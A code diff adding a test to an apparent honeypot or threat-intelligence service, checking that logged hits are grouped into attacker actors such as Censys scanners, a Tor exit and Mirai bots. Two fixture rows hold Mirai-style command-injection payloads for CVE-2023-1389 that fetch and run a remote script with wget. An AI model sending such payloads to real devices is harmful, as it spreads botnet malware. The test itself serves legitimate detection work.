@@ -63,3 +63,39 @@ def test_ingest_requires_key_and_stores(tmp_path, monkeypatch):
 def test_ingest_disabled_without_key(monkeypatch):
     monkeypatch.setattr(main, "INGEST_KEY", "")
     assert client.post("/ingest/events", json=[], headers={"X-Ingest-Key": ""}).status_code == 401
+
+
+def _hit(ip, path="/", body="", ua="", cve=None, cls="noise", t="2026-11-01T20:00:00Z", hosting=1, proxy=0):
+    return {"source_ip": ip, "asn": 1, "country_code": "NL", "classification": cls, "cve_id": cve, "timestamp": t,
+            "path": path, "body_preview": body, "user_agent": ua, "hosting": hosting, "proxy": proxy}
+
+
+def test_actor_clustering(monkeypatch):
+    from app import actors
+
+    monkeypatch.setitem(actors._lists, "research", {"66.132.172.134": "censys", "66.132.172.135": "censys"})
+    monkeypatch.setitem(actors._lists, "tor", {"185.220.101.60"})
+    luci = "/cgi-bin/luci/;stok=/locale?form=country"
+    rows = [
+        # Same Mirai template, different bots, different download servers -> one actor (payload fingerprint).
+        _hit("45.90.163.37", luci, "country=$(cd /tmp; wget http://1.2.3.4/x.sh; sh x.sh)", cve="CVE-2023-1389", cls="targeted"),
+        _hit("91.92.1.9", luci, "country=$(cd /tmp; wget http://5.6.7.8/x.sh; sh x.sh)", cve="CVE-2023-1389", cls="targeted"),
+        # Two Censys scanners -> one actor labelled Censys, tagged scanner.
+        _hit("66.132.172.134", "/", ua="Mozilla/5.0 (compatible; CensysInspect/1.1)"),
+        _hit("66.132.172.135", "/robots.txt"),
+        # Same bare probe from two unrelated hosts -> NOT merged.
+        _hit("203.0.113.77", luci, cve="CVE-2023-1389", cls="targeted", ua="a"),
+        _hit("198.18.5.5", luci, cve="CVE-2023-1389", cls="targeted", ua="b"),
+        # Tor exit, unrelated -> its own actor.
+        _hit("185.220.101.60", "/.env", hosting=0),
+    ]
+    ip_to_actor, dossiers = actors.build(rows)
+    assert ip_to_actor["45.90.163.37"] == ip_to_actor["91.92.1.9"]
+    assert ip_to_actor["66.132.172.134"] == ip_to_actor["66.132.172.135"]
+    assert ip_to_actor["203.0.113.77"] != ip_to_actor["198.18.5.5"]
+    assert len(dossiers) == 5
+    by_label = {d["label"]: d for d in dossiers}
+    assert by_label["Censys"]["tags"] == ["cloud", "scanner"]
+    assert dossiers[0]["classification"] == "targeted" and dossiers[0]["cves"] == ["CVE-2023-1389"]
+    tor_actor = next(d for d in dossiers if d["ips"] == ["185.220.101.60"])
+    assert tor_actor["tags"] == ["tor"]
